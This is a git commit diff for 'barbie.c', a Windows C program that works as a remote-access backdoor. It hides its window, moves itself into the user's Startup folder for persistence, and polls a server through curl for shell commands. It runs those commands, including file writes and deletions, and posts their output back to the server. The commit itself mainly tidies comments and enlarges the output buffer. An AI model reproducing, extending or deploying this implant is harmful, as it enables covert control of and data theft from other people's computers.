989f7eeabc5fbf6745acf6d05283895916cacbb7
komodo <68278515+komodoooo@users.noreply.github.com>
2024-09-13 16:06:07 +0200

    increased max size constant

--- barbie.c
+++ barbie.c
@@ -2,8 +2,8 @@
 #include <stdlib.h>
 #include <string.h>
 #include <windows.h>
-#define MAX_SIZE 8192
-#define SERVER "127.0.0.1:5001"                             //edit this with your own
+#define MAX_SIZE 32768                                      // 32kb
+#define SERVER "127.0.0.1:5001"
 
 int move_to_startup();
 char *get_exe_name();
@@ -14,22 +14,20 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     chdir(getenv("USERPROFILE"));
     char curl[128];
     while(1){
-        Sleep(500);                                         //0.5s
+        Sleep(500);                                         // 0.5s delay
         sprintf(curl, "curl -k -s %s/command", SERVER);
         char *command = get_cmd(curl);
-        if(!command || !strlen(command)){
-            continue;
-        }
-        if(!strncmp(command, "cd", 2)){                     //changing directory
+        if(!command || !strlen(command)) continue;
+        if(!strncmp(command, "cd", 2)){                     // changing directory
             chdir(strdup(command+3));
             command = strdup("echo.");
         }
-        if(strstr(command, ">") || strstr(command, "del")){ //writing and deleting files
+        if(strstr(command, ">") || strstr(command, "del")){ // writing and deleting files
             get_cmd(command);
             command = strdup("echo.");
         }
         char *result = get_cmd(command);
-        FILE *fp = fopen("tmp.txt", "wb");                  //ensure non-ascii characters
+        FILE *fp = fopen("tmp.txt", "wb");                  // ensure non-ascii characters
         size_t txt = fwrite(result, sizeof(char), strlen(result), fp);
         fclose(fp);
         sprintf(curl, "curl -k -s -X POST %s/result --data-binary @tmp.txt", SERVER);
@@ -38,12 +36,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
 }
 
-int move_to_startup(const char *file_path){                 //1 successfully moved, -1 error, 0 already in
+int move_to_startup(const char *file_path){                 // 1 successfully moved, -1 error, 0 already in
     char current_path[MAX_PATH];
     GetModuleFileName(NULL, current_path, MAX_PATH);
     char destination_path[MAX_PATH];
     sprintf(destination_path, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s", getenv("APPDATA"), file_path);
-    if(strcmp(current_path, destination_path)!=0) return MoveFile(current_path,destination_path)?1:-1;
+    if(strcmp(current_path, destination_path)) return MoveFile(current_path,destination_path)?1:-1;
     return 0;
 }
 
@@ -51,7 +49,7 @@ char *get_exe_name(){
     char exe_path[MAX_PATH];
     GetModuleFileName(NULL, exe_path, MAX_PATH);
     char *exe_name = strrchr(exe_path, '\\');
-    if(exe_name!=NULL) exe_name++;
+    if(exe_name != NULL) exe_name++;
     else exe_name=exe_path;
     return exe_name;
 }
@@ -59,18 +57,18 @@ char *get_exe_name(){
 char *get_cmd(const char *cmd) {
     char *buffer = malloc(MAX_SIZE), *output = malloc(MAX_SIZE);
     output[0] = '\0';
-    STARTUPINFO si;                                        //initialize process and its attributes
+    STARTUPINFO si;                                         // initialize process and its attributes
     PROCESS_INFORMATION pi;
     SECURITY_ATTRIBUTES sa;
     sa.nLength = sizeof(SECURITY_ATTRIBUTES);
     sa.bInheritHandle = TRUE;
     sa.lpSecurityDescriptor = NULL;
-    HANDLE hReadPipe, hWritePipe;                          //create a pipe for output redirection
+    HANDLE hReadPipe, hWritePipe;                           // create a pipe for output redirection
     CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);
     SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
-    si.dwFlags |= STARTF_USESTDHANDLES;                    // use standard handles
+    si.dwFlags |= STARTF_USESTDHANDLES;                     // use standard handles
     si.hStdOutput = hWritePipe;
     si.hStdError = hWritePipe;
     ZeroMemory(&pi, sizeof(pi));
@@ -79,7 +77,7 @@ char *get_cmd(const char *cmd) {
     CreateProcess(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     CloseHandle(hWritePipe);
     DWORD bytesRead;
-    while(ReadFile(hReadPipe, buffer, MAX_SIZE-1, &bytesRead, NULL) && bytesRead>0){
+    while(ReadFile(hReadPipe, buffer, MAX_SIZE-1, &bytesRead, NULL) && bytesRead > 0){
         buffer[bytesRead] = '\0';
         if(strlen(output)+bytesRead < MAX_SIZE) strcat(output, buffer);
         else break;
